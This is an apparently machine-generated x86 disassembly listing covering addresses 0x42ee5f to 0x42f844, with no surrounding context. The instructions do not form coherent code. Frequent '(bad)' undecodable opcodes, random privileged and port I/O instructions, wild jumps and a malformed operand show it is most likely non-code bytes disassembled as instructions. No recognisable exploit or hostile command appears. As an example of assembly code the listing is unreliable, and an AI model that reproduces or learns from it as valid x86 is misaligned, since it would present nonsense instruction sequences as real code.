  42ee5f:	popa   
  42ee60:	mov    fs,WORD PTR [edi+0x44]
  42ee63:	push   eax
  42ee64:	mov    bl,0x1f
  42ee66:	pop    es
  42ee67:	sti    
  42ee68:	clc    
  42ee69:	adc    cl,dh
  42ee6b:	aas    
  42ee6c:	or     eax,0x7eff972a
  42ee71:	or     BYTE PTR [edi-0x8],bh
  42ee74:	adc    DWORD PTR [ebx-0x560a8105],esi
  42ee7a:	sbb    BYTE PTR ds:0x7cef6525,al
  42ee80:	call   esp
  42ee82:	inc    esp
  42ee83:	adc    BYTE PTR [edi-0x2b8010a3],al
  42ee89:	mov    cl,0x1b
  42ee8b:	mov    edi,0x5a39e6ff
  42ee90:	iret   
  42ee91:	fwait
  42ee92:	inc    DWORD PTR [esi-0x72f43caf]
  42ee98:	inc    ebx
  42ee99:	cdq    
  42ee9a:	mov    WORD PTR [eax+0x11],cs
  42ee9d:	or     al,0x4d
  42ee9f:	sbb    al,0xde
  42eea1:	mov    ebp,es
  42eea3:	inc    eax
  42eea4:	add    eax,0xdffffa4
  42eea9:	push   edx
  42eeaa:	int    0x75
  42eeac:	adc    BYTE PTR [eax],dl
  42eeae:	adc    al,0x14
  42eeb0:	jbe    0x42eeb0
  42eeb2:	xchg   BYTE PTR [eax+0x0],cl
	...
  42eed1:	add    BYTE PTR [ecx],cl
  42eed3:	and    al,BYTE PTR [edi+0x8]
  42eed6:	ds pop ecx
  42eed8:	fxch   st(1)
  42eeda:	loope  0x42ee93
  42eedc:	and    eax,0x4cc1c39
  42eee1:	ds repz (bad) 
  42eee4:	push   cs
  42eee5:	(bad)  
  42eee6:	ficomp WORD PTR [ebx+0xfc180]
  42eeec:	mov    gs,WORD PTR [ebp-0x3b06cf6c]
  42eef2:	int    0xeb
  42eef4:	out    0x3,eax
  42eef6:	or     eax,0x32035900
  42eefb:	dec    edi
  42eefc:	sbb    al,0x89
  42eefe:	xor    DWORD PTR [ecx-0x5b73637b],eax
  42ef04:	in     eax,0x1
  42ef06:	or     eax,0x92361600
  42ef0b:	or     dh,ch
  42ef0d:	add    BYTE PTR [edi-0x7bcb170c],0x43
  42ef14:	or     eax,0x5e177810
  42ef19:	inc    esi
  42ef1a:	sub    eax,0xad03e8d3
  42ef1f:	push   DWORD PTR [ecx-0x17ffe7d4]
  42ef25:	add    ecx,DWORD PTR ds:0x678ec112
  42ef2b:	in     al,0xb5
  42ef2d:	pushf  
  42ef2e:	sbb    BYTE PTR [eax-0xa],bh
  42ef31:	inc    ebx
  42ef32:	or     eax,0x171231
	...
  42ef53:	add    BYTE PTR ds:0x518f1189,al
  42ef59:	fsubr  st(0),st
  42ef5b:	xor    esi,DWORD PTR [ebp-0x69629e18]
  42ef61:	jp     0x42ef8c
  42ef63:	sbb    BYTE PTR [ebx-0x77],cl
  42ef66:	sbb    ch,BYTE PTR [ebx+ecx*1+0x203e903]
  42ef6d:	cwde   
  42ef6e:	in     al,0x16
  42ef70:	pop    ss
  42ef71:	add    eax,0x8105449a
  42ef76:	rcr    DWORD PTR [ebx],1
  42ef78:	loope  0x42ef74
  42ef7a:	gs fwait
  42ef7c:	lds    ecx,FWORD PTR [edx]
  42ef7e:	(bad)  [esi-0x2700242f]
  42ef84:	push   ds
  42ef85:	cdq    
  42ef86:	je     0x42ef8d
  42ef88:	inc    ecx
  42ef89:	pushf  
  42ef8a:	in     al,dx
  42ef8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef8c:	mov    eax,ds:0x8bf9e798
  42ef91:	cmp    esp,DWORD PTR [ecx+edi*8]
  42ef94:	(bad)  
  42ef95:	cwde   
  42ef96:	je     0x42ef5d
  42ef98:	push   ds
  42ef99:	jge    0x42ef5d
  42ef9b:	xchg   ecx,eax
  42ef9c:	test   DWORD PTR [edx-0x406d8105],edx
  42efa2:	je     0x42ef89
  42efa4:	fld    QWORD PTR [edx+0x4402c544]
  42efaa:	push   eax
  42efab:	push   ecx
  42efac:	jge    0x42f005
  42efae:	add    cl,ch
  42efb0:	cmp    DWORD PTR [esi],esi
  42efb2:	mov    al,0xe8
  42efb4:	xor    eax,0xace57b
	...
  42efd5:	add    ah,cl
  42efd7:	or     BYTE PTR [eax],al
  42efd9:	lahf   
  42efda:	xchg   ebp,eax
  42efdb:	xchg   ecx,eax
  42efdc:	sti    
  42efdd:	mov    bh,0x12
  42efdf:	test   al,0x4
  42efe1:	lods   al,BYTE PTR ds:[esi]
  42efe2:	push   cs
  42efe3:	add    BYTE PTR [edi-0x39],bh
  42efe6:	adc    al,BYTE PTR [eax]
  42efe8:	jg     0x42ef79
  42efea:	push   ss
  42efeb:	add    BYTE PTR [edx+0x2a],bl
  42efee:	test   DWORD PTR [esp],edi
  42eff1:	in     eax,dx
  42eff2:	clc    
  42eff3:	xchg   DWORD PTR cs:[eax],edx
  42eff6:	fwait
  42eff7:	(bad)  
  42eff9:	jb     0x42f00b
  42effb:	test   DWORD PTR [eax+ebp*2],edx
  42effe:	test   DWORD PTR [edi],edi
  42f000:	or     BYTE PTR [edx+ecx*1-0x7f],ah
  42f004:	aaa    
  42f005:	sbb    BYTE PTR [ebx+edi*8],bl
  42f008:	mov    WORD PTR [ebx],?
  42f00a:	or     eax,0xcf01e842
  42f00f:	(bad)  
  42f010:	inc    ecx
  42f012:	or     esp,edx
  42f014:	mov    edi,0xb0c5165
  42f019:	add    BYTE PTR [ebx+0x47],cl
  42f01c:	or     BYTE PTR [ebx-0x1f3efbcd],cl
  42f022:	iretw  
  42f024:	out    0x43,eax
  42f026:	lock sti 
  42f028:	call   FWORD PTR [esi-0x36]
  42f02b:	mov    ecx,0xcfbf0004
  42f030:	and    eax,DWORD PTR [edx+esi*8]
  42f033:	loop   0x42effe
  42f035:	pusha  
  42f036:	jecxz  0x42efba
  42f038:	stc    
  42f039:	mov    eax,DWORD PTR [eax]
	...
  42f057:	add    bl,dh
  42f059:	add    esp,DWORD PTR [ebx-0x40]
  42f05c:	add    al,0x89
  42f05e:	outs   dx,DWORD PTR ds:[esi]
  42f05f:	add    al,0xaf
  42f061:	add    eax,0xbbf7d0fb
  42f066:	xor    edx,ecx
  42f068:	out    0x1,al
  42f06a:	lea    ecx,[edx-0x3c]
  42f06d:	int3   
  42f06e:	out    0xd5,eax
  42f070:	mov    eax,ds:0xf6eafffe
  42f075:	lods   al,BYTE PTR ds:[esi]
  42f076:	mov    ebx,0x6f03484
  42f07b:	jmp    FWORD PTR [ebx-0x13807cfa]
  42f081:	loope  0x42f079
  42f083:	pusha  
  42f084:	mov    ds:0xb4440066,eax
  42f089:	(bad)  
  42f08a:	push   esi
  42f08b:	pop    esi
  42f08c:	out    0xff,al
  42f08e:	dec    DWORD PTR [edx+0x3affb260]
  42f094:	jne    0x42f09c
  42f096:	imul   edx,DWORD PTR [ecx],0x1d
  42f099:	cmp    eax,0xdbe46b08
  42f09e:	dec    ebp
  42f09f:	push   eax
  42f0a0:	sub    ebp,ebp
  42f0a2:	add    ebp,eax
  42f0a4:	push   ss
  42f0a5:	cmp    eax,DWORD PTR [eax]
  42f0a7:	add    dl,cl
  42f0a9:	mov    ecx,0x43ff0004
  42f0ae:	sbb    BYTE PTR [ebx+0x1096a80d],cl
  42f0b4:	push   ds
  42f0b5:	pusha  
  42f0b6:	jnp    0x42f078
  42f0b8:	adc    dh,BYTE PTR [esp+eax*8]
  42f0bb:	lea    eax,[eax]
	...
  42f0d9:	add    ah,cl
  42f0db:	push   ecx
  42f0dc:	ret    0xd9fb
  42f0df:	add    al,0x0
  42f0e1:	xchg   esp,edx
  42f0e3:	mov    al,0x8a
  42f0e5:	add    edi,ebx
  42f0e7:	pop    ecx
  42f0e8:	das    
  42f0e9:	add    al,0xfe
  42f0eb:	dec    edi
  42f0ec:	jnp    0x42f0ae
  42f0ee:	add    dl,BYTE PTR [esp+eax*8]
  42f0f1:	(bad)  
  42f0f2:	int3   
  42f0f3:	add    ebp,0xb7a0d04
  42f0f9:	and    al,0x11
  42f0fb:	push   cs
  42f0fc:	dec    esp
  42f0fd:	sbb    BYTE PTR [esi+0x5dfb35a7],al
  42f103:	lahf   
  42f104:	ror    al,cl
  42f106:	mov    edi,esp
  42f108:	add    eax,0x4424cc95
  42f10d:	sti    
  42f10e:	iret   
  42f10f:	mov    ds:0xfb61faff,eax
  42f114:	inc    DWORD PTR [esi+0x18a9f54]
  42f11a:	aas    
  42f11b:	shr    BYTE PTR [esi],cl
  42f11d:	or     al,0x1e
  42f11f:	loopne 0x42f19b
  42f121:	rcr    BYTE PTR [edx],0x2c
  42f124:	les    ecx,FWORD PTR [ebp+0x4c4da4c]
  42f12a:	or     eax,0x86184c0e
  42f12f:	test   al,0x96
  42f131:	push   eax
  42f132:	std    
  42f133:	mov    ch,0xcc
  42f135:	test   ch,cl
  42f137:	mov    dh,BYTE PTR [eax-0x3f]
  42f13a:	mov    BYTE PTR [eax-0x6a],ch
  42f13d:	mov    edi,0x0
	...
  42f15a:	add    BYTE PTR [eax],al
  42f15c:	xchg   edx,eax
  42f15d:	adc    ebx,ebx
  42f15f:	add    edx,DWORD PTR [esi+0xc86f760]
  42f165:	add    BYTE PTR [edi],dh
  42f167:	cdq    
  42f168:	fucomp st(3)
  42f16a:	adc    eax,0xe2c089cb
  42f16f:	outs   dx,BYTE PTR ds:[esi]
  42f170:	dec    esp
  42f171:	sub    DWORD PTR [eax],0xffffff99
  42f174:	mov    ds:0xc48ce8fc,eax
  42f179:	imul   DWORD PTR [ebp+0x3]
  42f17c:	push   esi
  42f17d:	xor    cl,dl
  42f17f:	aam    0x55
  42f181:	jl     0x42f12c
  42f183:	or     DWORD PTR [eax+0x364374bf],ebx
  42f189:	mov    ebp,0x9803433
  42f18e:	stc    
  42f18f:	ror    BYTE PTR [esi],0xa0
  42f192:	pop    edi
  42f193:	inc    esp
  42f194:	or     eax,0x250c2a87
  42f199:	js     0x42f1aa
  42f19b:	cdq    
  42f19c:	push   ss
  42f19d:	xchg   edx,esi
  42f19f:	jmp    0x42f170
  42f1a1:	cmp    BYTE PTR [ecx-0x16c1be89],bh
  42f1a7:	ror    BYTE PTR [esi-0x34],0x8a
  42f1ab:	fdiv   DWORD PTR [eax]
  42f1ad:	add    BYTE PTR [edx],ch
  42f1af:	inc    ecx
  42f1b0:	and    eax,0xd460dc8
  42f1b5:	mov    ecx,0xd3b8d7aa
  42f1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f1bb:	add    ecx,esi
  42f1bd:	cmp    BYTE PTR [ecx+0x97],ch
	...
  42f1db:	add    BYTE PTR [eax],al
  42f1dd:	add    BYTE PTR [ecx],cl
  42f1df:	ds jmp 0xf27f40a5
  42f1e5:	(bad)  
  42f1e6:	clc    
  42f1e7:	jmp    DWORD PTR [ecx]
  42f1e9:	inc    ecx
  42f1ea:	inc    ebp
  42f1eb:	out    0xd3,eax
  42f1ed:	inc    ebp
  42f1ee:	or     eax,0x623a2285
  42f1f3:	mov    DWORD PTR [ebp-0x6d00f121],ebp
  42f1f9:	mov    WORD PTR [eax+edi*4+0x79aeef00],ds
  42f200:	inc    eax
  42f201:	jmp    0xd194f018
  42f206:	cmp    cl,dl
  42f208:	(bad)  
  42f209:	call   0xab9daf8f
  42f20e:	push   0xffffff90
  42f210:	stos   DWORD PTR es:[edi],eax
  42f211:	call   0x7942f95e
  42f216:	sqrtps xmm7,XMMWORD PTR [edi-0x42]
  42f21a:	outs   dx,BYTE PTR ds:[esi]
  42f21b:	and    al,BYTE PTR ds:0x7215a56a
  42f221:	loop   0x42f1ae
  42f223:	jl     0x42f285
  42f225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f226:	xchg   ebp,eax
  42f227:	xchg   esp,eax
  42f228:	jg     0x42f1cb
  42f22a:	cmc    
  42f22b:	or     al,0x4
  42f22d:	sets   BYTE PTR [edi+edi*4-0x25b29e]
  42f235:	call   0xe9808748
  42f23a:	push   cs
  42f23b:	add    BYTE PTR [ecx],al
  42f23d:	std    
  42f23e:	mov    ah,0x32
  42f240:	das    
  42f241:	ja     0x42f243
	...
  42f25f:	add    BYTE PTR [edi+0x3],ah
  42f262:	(bad)  
  42f263:	call   0x18476f76
  42f268:	jbe    0x42f251
  42f26a:	mov    ebp,0xb2fb8638
  42f26f:	cmc    
  42f270:	arpl   ax,sp
  42f272:	push   eax
  42f273:	test   eax,0xbad2d70e
  42f278:	sar    DWORD PTR [eax+esi*2-0x18],cl
  42f27c:	jns    0x42f283
  42f27e:	jb     0x42f262
  42f280:	mov    edi,DWORD PTR [eax]
  42f282:	sti    
  42f283:	loop   0x42f249
  42f285:	or     eax,0x2acedada
  42f28a:	mov    edi,0x8504998f
  42f28f:	retf   
  42f290:	fistp  QWORD PTR [edi]
  42f292:	add    BYTE PTR [eax],al
  42f294:	jb     0x42f25a
  42f296:	push   ebp
  42f297:	mov    eax,DWORD PTR [eax]
  42f299:	ror    BYTE PTR [edx+0x57],cl
  42f29c:	out    dx,eax
  42f29d:	push   0x2b
  42f29f:	sar    BYTE PTR [esi+ecx*8-0x3c06f0f5],0x48
  42f2a7:	and    eax,0xc0000364
  42f2ac:	in     eax,dx
  42f2ad:	inc    eax
  42f2ae:	cld    
  42f2af:	xor    dh,BYTE PTR [edi+eax*1-0x57f23752]
  42f2b6:	int3   
  42f2b7:	inc    eax
  42f2b8:	icebp  
  42f2b9:	inc    ebx
  42f2ba:	add    BYTE PTR [ebp+ebp*8+0x75],dh
  42f2be:	sar    BYTE PTR [esp+ebx*1],0xf2
  42f2c2:	in     eax,0x33
	...
  42f2e0:	add    BYTE PTR [eax],al
  42f2e2:	dec    edi
  42f2e3:	out    dx,al
  42f2e4:	test   bl,bl
  42f2e6:	and    ecx,DWORD PTR [edi]
  42f2e8:	nop
  42f2e9:	add    BYTE PTR [ebx+eax*1],dh
  42f2ec:	div    DWORD PTR [ebp+0x40]
  42f2ef:	jns    0x42f2ac
  42f2f1:	mov    esp,DWORD PTR [edx+0x5c]
  42f2f4:	mov    esp,DWORD PTR cs:[ebx+eax*1]
  42f2f8:	pop    es
  42f2f9:	mov    dh,0x7f
  42f2fb:	(bad)  
  42f2fd:	push   esi
  42f2fe:	jae    0x42f291
  42f300:	rcl    DWORD PTR [ebx],cl
  42f302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f303:	add    al,BYTE PTR [ebp+0x6fbd8c0]
  42f309:	mov    dh,0x34
  42f30b:	(bad)
  42f30e:	in     eax,dx
  42f30f:	aas    
  42f310:	cld    
  42f311:	mov    ebp,DWORD PTR [edx-0x49bf0e6e]
  42f317:	xor    BYTE PTR [ecx+ebp*1+0xa],0x44
  42f31c:	adc    DWORD PTR [eax+0x1aba179],eax
  42f322:	pop    ds
  42f323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f324:	push   es
  42f325:	mov    dh,0xe4
  42f327:	push   es
  42f328:	scas   al,BYTE PTR es:[edi]
  42f329:	or     al,0xd
  42f32b:	fadd   QWORD PTR [eax+0x5d]
  42f32e:	dec    ebp
  42f32f:	cdq    
  42f330:	add    dh,BYTE PTR [edx+0x5d3fdc11]
  42f336:	dec    ebp
  42f337:	cdq    
  42f338:	sbb    eax,0x1da06cc1
  42f33d:	pop    es
  42f33e:	push   ebp
  42f33f:	lods   eax,DWORD PTR ds:[esi]
  42f340:	dec    edx
  42f341:	fldenv [esi+0x78]
  42f344:	sar    DWORD PTR [edi+0x0],1
	...
  42f362:	add    BYTE PTR [eax],al
  42f364:	ds push eax
  42f366:	xlat   BYTE PTR ds:[ebx]
  42f367:	dec    esp
  42f368:	sbb    DWORD PTR ds:0xad4d8402,ebp
  42f36e:	jo     0x42f331
  42f370:	mov    BYTE PTR [eax+ecx*4-0x66f400],bl
  42f377:	out    0x19,al
  42f379:	sbb    eax,0x57980bbf
  42f37e:	mov    BYTE PTR [eax+ecx*4],al
  42f381:	xchg   edi,eax
  42f382:	add    al,0x0
  42f384:	or     eax,0xc2fc106e
  42f389:	enter  0x7592,0x15
  42f38d:	jle    0x42f37f
  42f38f:	jmp    0x42f38f
  42f391:	fadd   DWORD PTR [ebx]
  42f393:	repz xor eax,0xe5f3bfa1
  42f399:	or     bh,0x7f
  42f39c:	sub    BYTE PTR [ebx+0x2f2573ff],0xc5
  42f3a3:	cli    
  42f3a4:	repnz add dh,BYTE PTR cs:[ebx-0x3f7f4233]
  42f3ac:	pop    ecx
  42f3ad:	xchg   edx,eax
  42f3ae:	xchg   BYTE PTR [edx-0x3],cl
  42f3b1:	int3   
  42f3b2:	inc    ebx
  42f3b3:	push   cs
  42f3b4:	lea    edx,[ebx-0x6]
  42f3b7:	sbb    BYTE PTR [eax-0x2d],0xfe
  42f3bb:	dec    DWORD PTR ds:0xb97592f7
  42f3c1:	add    BYTE PTR [ecx-0x16ff4cd5],bh
  42f3c7:	add    eax,DWORD PTR [eax]
	...
  42f3e5:	add    BYTE PTR [edx+0x46c3d7bf],dh
  42f3eb:	sub    DWORD PTR [eax],esp
  42f3ed:	rol    DWORD PTR ds:0x61086e00,0xb6
  42f3f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3f5:	add    ebx,edi
  42f3f7:	shr    BYTE PTR [eax],1
  42f3f9:	mov    BYTE PTR cs:[edi-0x346c1c8b],dh
  42f400:	js     0x42f3b0
  42f402:	xor    al,BYTE PTR [eax]
  42f404:	outs   dx,BYTE PTR ds:[esi]
  42f405:	lods   eax,DWORD PTR ds:[esi]
  42f406:	xchg   edx,eax
  42f407:	ror    BYTE PTR ds:0x53fc2910,cl
  42f40d:	(bad)  
  42f40e:	fisttp DWORD PTR [ebp+0x40030fc2]
  42f414:	push   0xe8f815c2
  42f419:	add    edi,edx
  42f41b:	mov    esi,0xbfeaac37
  42f420:	inc    edx
  42f421:	ss jae 0x42f428
  42f424:	jmp    0xe13b4153
  42f429:	add    ecx,DWORD PTR ds:0x1ca9a201
  42f42f:	jns    0x42f425
  42f431:	addr16 aas 
  42f433:	inc    ecx
  42f434:	jmp    0x72145266
  42f439:	rol    edx,1
  42f43b:	and    BYTE PTR [eax-0x386d0f0],0x73
  42f442:	fild   WORD PTR [eax-0x17]
  42f445:	mov    bl,bh
  42f447:	adc    BYTE PTR [ebx],0x95
	...
  42f466:	add    BYTE PTR [eax],al
  42f468:	pop    ecx
  42f469:	sti    
  42f46a:	test   al,0x82
  42f46c:	iret   
  42f46d:	div    eax
  42f46f:	add    ecx,DWORD PTR ds:0xbd1227c9
  42f475:	cwde   
  42f476:	add    ch,ah
  42f478:	idiv   DWORD PTR [edi+0xee108]
  42f47e:	jmp    FWORD PTR [edx]
  42f480:	test   BYTE PTR [edi+0x174fce75],al
  42f486:	leave  
  42f487:	loope  0x42f49f
  42f489:	add    BYTE PTR [eax],al
  42f48b:	dec    edi
  42f48c:	and    DWORD PTR [edx+0x6066e93f],esi
  42f492:	inc    eax
  42f493:	jmp    0x7e0378a6
  42f498:	outs   dx,BYTE PTR ds:[esi]
  42f499:	test   DWORD PTR ds:0xffccab3d,edi
  42f49f:	dec    edi
  42f4a0:	cwde   
  42f4a1:	test   DWORD PTR [edi],0x5890ee9
  42f4a7:	test   DWORD PTR [eax+0x43e9ffcc],esi
  42f4ad:	jl     0x42f481
  42f4af:	sub    cl,BYTE PTR [ecx]
  42f4b1:	adc    al,0x2
  42f4b3:	jb     0x42f4bf
  42f4b5:	in     al,0xb
  42f4b7:	pusha  
  42f4b8:	inc    ecx
  42f4b9:	test   ebx,eax
  42f4bb:	push   cs
  42f4bc:	add    ecx,DWORD PTR [esi+0x4]
  42f4bf:	jmp    0x2b155073
  42f4c4:	adc    DWORD PTR [ecx],esi
  42f4c6:	xchg   DWORD PTR [ecx+0x2874bfa3],edx
	...
  42f4e8:	add    BYTE PTR [eax],al
  42f4ea:	test   dl,dh
  42f4ec:	(bad)  
  42f4ed:	lahf   
  42f4ee:	int    0xff
  42f4f0:	xchg   BYTE PTR [ecx-0x1ef746c9],dh
  42f4f6:	push   cs
  42f4f7:	add    BYTE PTR [ebp-0xc6c00a3],cl
  42f4fd:	cwd    
  42f4ff:	or     edi,DWORD PTR [ecx]
  42f501:	pop    esi
  42f502:	sbb    edi,ecx
  42f504:	add    BYTE PTR [eax+0x16],0xf8
  42f508:	(bad)  
  42f509:	call   0x1310a5f
  42f50e:	(bad)  
  42f510:	je     0x42f52c
  42f512:	aas    
  42f513:	les    ebp,FWORD PTR [ecx-0x37]
  42f516:	lods   al,BYTE PTR ds:[esi]
  42f517:	idiv   edi
  42f519:	jmp    DWORD PTR [edx+0x67d69035]
  42f51f:	jmp    edi
  42f521:	ss je  0x42f523
  42f524:	dec    DWORD PTR [eax+0x43ce23b9]
  42f52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f52b:	aad    0x56
  42f52d:	ret    
  42f52e:	jno    0x42f5a8
  42f530:	in     al,dx
  42f531:	push   ebx
  42f532:	iret   
  42f533:	sbb    cl,dh
  42f535:	inc    ebx
  42f536:	je     0x42f508
  42f538:	not    BYTE PTR ds:0x3b915c
  42f53e:	out    0xf0,eax
  42f540:	pop    es
  42f541:	(bad)  
  42f542:	jnp    0x42f4c7
  42f544:	iret   
  42f545:	add    BYTE PTR [edi+edi*8+0x7a],dh
  42f549:	jge    0x42f583
  42f54b:	inc    DWORD PTR [esi]
  42f54d:	test   BYTE PTR [eax],al
	...
  42f56b:	add    BYTE PTR [ecx-0x48fffffc],bl
  42f571:	lock verw WORD PTR [ebx]
  42f575:	cmp    DWORD PTR [ebx-0x900dc00],0x75
  42f57c:	cmp    al,0x67
  42f57e:	ret    0x8bfe
  42f581:	outs   dx,DWORD PTR ds:[esi]
  42f582:	test   eax,eax
  42f584:	add    DWORD PTR [esi+esi*8-0x298d38b],edx
  42f58b:	dec    BYTE PTR [ebx-0x43f7a91]
  42f591:	sbb    BYTE PTR [edi-0x12010c00],0x45
  42f598:	loopne 0x42f59d
  42f59a:	dec    esi
  42f59b:	push   edi
  42f59c:	rol    BYTE PTR [eax],1
  42f59e:	lea    edi,[eax+0x2f2]
  42f5a4:	or     eax,0x5025424
  42f5a9:	cdq    
  42f5aa:	jmp    esi
  42f5ac:	add    al,0x14
  42f5ae:	or     al,0x4
  42f5b0:	cwde   
  42f5b1:	or     BYTE PTR [eax],cl
  42f5b3:	add    al,0xd
  42f5b5:	cdq    
  42f5b6:	cmp    BYTE PTR [ebp+0x1d],0x99
  42f5ba:	jp     0x42f601
  42f5bc:	add    DWORD PTR [eax],edx
  42f5be:	dec    ecx
  42f5bf:	or     BYTE PTR [ebx],ah
  42f5c1:	push   0x990f004d
  42f5c6:	(bad)  
  42f5c7:	cmp    BYTE PTR [eax-0x77],al
  42f5ca:	adc    al,BYTE PTR [edx+eax*1]
  42f5cd:	retf   0x1038
	...
  42f5ec:	add    BYTE PTR [eax],al
  42f5ee:	sbb    dl,dl
  42f5f0:	add    eax,0x2eeba0b
  42f5f5:	mov    edi,0x398b4
  42f5fa:	or     eax,0xff72c4de
  42f5ff:	in     eax,dx
  42f600:	les    esp,FWORD PTR [edx+0x34]
  42f603:	fwait
  42f604:	(bad)  
  42f605:	mov    dl,0xb
  42f607:	enter  0xc302,0xbd
  42f60b:	jmp    0x99107bab
  42f610:	dec    DWORD PTR [edx]
  42f612:	jp     0x42f5ae
  42f614:	xor    bh,bl
  42f616:	shl    BYTE PTR [eax+0x70ddc302],0x19
  42f61d:	inc    eax
  42f61e:	or     eax,0xfb012999
  42f623:	jge    0x42f614
  42f625:	popa   
  42f626:	in     al,0xa2
  42f628:	(bad)  
  42f629:	mov    dl,0x3
  42f62b:	call   0xf2a0b932
  42f630:	fwait
  42f631:	popa   
  42f632:	dec    ebp
  42f633:	xchg   edi,eax
  42f634:	dec    DWORD PTR [edx]
  42f636:	ret    0x1da1
  42f639:	add    BYTE PTR [edx+0x0],bl
  42f63c:	push   ecx
  42f63d:	push   es
  42f63e:	xchg   ecx,eax
  42f63f:	add    cl,ch
  42f641:	mov    ch,cl
  42f643:	adc    ecx,DWORD PTR [eax+0x4]
  42f646:	cmp    al,bh
  42f648:	push   DWORD PTR [eax]
  42f64a:	std    
  42f64b:	adc    bl,BYTE PTR [ebp+0x4e]
  42f64e:	mov    eax,ds:0x3a6b2
	...
  42f66f:	add    BYTE PTR [edx-0x77],dl
  42f672:	fsub   st(7),st
  42f674:	or     BYTE PTR [eax-0x17],al
  42f677:	xor    dl,BYTE PTR [edi-0x6b]
  42f67a:	jmp    0xe2f5:0xfcf3a636
  42f681:	jmp    FWORD PTR [ebp-0x170fa4d0]
  42f687:	cmp    al,BYTE PTR [eax+0x259eed0a]
  42f68d:	and    dl,al
  42f68f:	mov    DWORD PTR [ecx],ecx
  42f691:	add    al,0xe9
  42f693:	add    eax,DWORD PTR [esi]
  42f695:	push   ecx
  42f696:	pop    ebx
  42f697:	pop    es
  42f698:	or     DWORD PTR [eax],eax
  42f69a:	jmp    0x3a0560d1
  42f69f:	cmp    DWORD PTR [ebp-0x10],esi
  42f6a2:	sub    BYTE PTR [ecx*1+0x98a91f9],al
  42f6a9:	add    al,0xe9
  42f6ab:	add    esi,DWORD PTR [ebx+0x779c11fe]
  42f6b1:	jge    0x42f69c
  42f6b3:	add    edx,DWORD PTR [eax-0x2948cb40]
  42f6b9:	mov    esp,0xb281513a
  42f6be:	es add al,0xbe
  42f6c1:	mov    ah,bh
  42f6c3:	jmp    0x42f6cd
  42f6c5:	inc    eax
  42f6c6:	jmp    0xf126884f
  42f6cb:	nop
  42f6cc:	xor    edx,0xf8291879
  42f6d2:	inc    DWORD PTR [eax+0x0]
	...
  42f6f0:	add    BYTE PTR [eax],al
  42f6f2:	pusha  
  42f6f3:	mov    edi,ebx
  42f6f5:	outs   dx,BYTE PTR ds:[esi]
  42f6f6:	mov    bh,BYTE PTR [edi-0x7edb0f8c]
  42f6fc:	lock push ecx
  42f6fe:	jne    0x42f685
  42f700:	sti    
  42f701:	push   esi
  42f702:	pop    ds
  42f703:	sub    eax,0xfae2f4fb
  42f708:	aas    
  42f709:	jmp    0xe947410b
  42f70e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f70f:	push   edx
  42f710:	test   eax,0xc0840ee9
  42f715:	mov    ch,0x49
  42f717:	cs push ebx
  42f719:	and    ax,0x3fae
  42f71d:	jmp    0xf1587c07
  42f722:	mov    al,ds:0xf50dffc8
  42f727:	jecxz  0x42f734
  42f729:	adc    DWORD PTR [eax],ebx
  42f72b:	mov    edi,ebx
  42f72d:	inc    BYTE PTR [ecx]
  42f72f:	nop
  42f730:	test   edi,edi
  42f732:	and    ch,bl
  42f734:	out    0x7c,eax
  42f736:	popf   
  42f737:	test   bl,bh
  42f739:	push   0xc
  42f73b:	test   DWORD PTR [edi],ebp
  42f73d:	test   eax,0xed827734
  42f742:	adc    al,BYTE PTR [eax]
  42f744:	add    BYTE PTR [edi-0x2a],al
  42f747:	jge    0x42f74b
  42f749:	icebp  
  42f74a:	push   cs
  42f74b:	add    al,ch
  42f74d:	lock pushf 
  42f74f:	test   bl,bh
  42f751:	push   ds
  42f752:	pushf  
  42f753:	repnz sbb ebx,ebx
	...
  42f772:	add    BYTE PTR [eax],al
  42f774:	into   
  42f775:	call   FWORD PTR [edx+0x47]
  42f778:	jl     0x42f75c
  42f77a:	xor    esi,edi
  42f77c:	into   
  42f77d:	call   DWORD PTR [edx+eiz*2+0x7a]
  42f781:	sub    eax,0x851514fb
  42f786:	jne    0x42f788
  42f788:	in     al,0x70
  42f78a:	jne    0x42f798
  42f78c:	sub    esi,0x7
  42f78f:	(bad)  
  42f790:	fnstcw WORD PTR [ebx+0x4e44011]
  42f796:	lock test DWORD PTR [edx-0xf],ecx
  42f79a:	push   cs
  42f79b:	call   0x43224b
  42f7a0:	push   0xce0e74c3
  42f7a5:	add    cl,BYTE PTR [esi-0x1]
  42f7a8:	mov    DWORD PTR [edi+0x6bbc75f6],eax
  42f7ae:	push   cs
  42f7af:	inc    BYTE PTR [ebx]
  42f7b1:	jo     0x42f736
  42f7b3:	mov    BYTE PTR [edx-0x4bef462a],0xce
  42f7ba:	sub    ah,0x5a
  42f7bd:	add    al,0x75
  42f7bf:	adc    al,0x5b
  42f7c1:	jo     0x42f838
  42f7c3:	and    BYTE PTR [edi],ch
  42f7c5:	test   BYTE PTR [ebx],0xff
  42f7c8:	or     DWORD PTR [edi-0x36938a0a],edx
  42f7ce:	div    BYTE PTR [ebp+0x54]
  42f7d1:	enter  0x75f6,0x6c
  42f7d5:	jo     0x42f7ec
  42f7d7:	hlt    
	...
  42f7f4:	add    BYTE PTR [eax],al
  42f7f6:	imul   eax,DWORD PTR [ebx+0x0],0x84902989
  42f7fd:	sar    BYTE PTR [ecx-0x47097ac5],0xaf
  42f804:	jecxz  0x42f802
  42f806:	pushf  
  42f807:	cld    
  42f808:	inc    DWORD PTR [ebx-0x74d5178c]
  42f80e:	cmp    dl,dl
  42f810:	sub    bl,bl
  42f812:	test   eax,0x2f29746d
  42f817:	ror    BYTE PTR [edi],1
  42f819:	jae    0x42f863
  42f81b:	or     al,BYTE PTR [edi+ebx*8]
  42f81e:	or     eax,0xd6204920
  42f823:	pop    esi
  42f824:	push   cs
  42f825:	call   DWORD PTR [ebp+0xc65df83]
  42f82b:	push   es
  42f82c:	sbb    DWORD PTR [eax],esp
  42f82e:	cli    
  42f82f:	test   BYTE PTR [edx-0x8740dfc],ch
  42f835:	out    0xb8,eax
  42f837:	sbb    ecx,DWORD PTR [ebx+0x18f24efb]
  42f83d:	and    BYTE PTR [eax-0x3a],ah
  42f840:	xchg   DWORD PTR es:[eax-0x6b],ecx
  42f844:	sub    bl,BYTE PTR [edx+0x68]
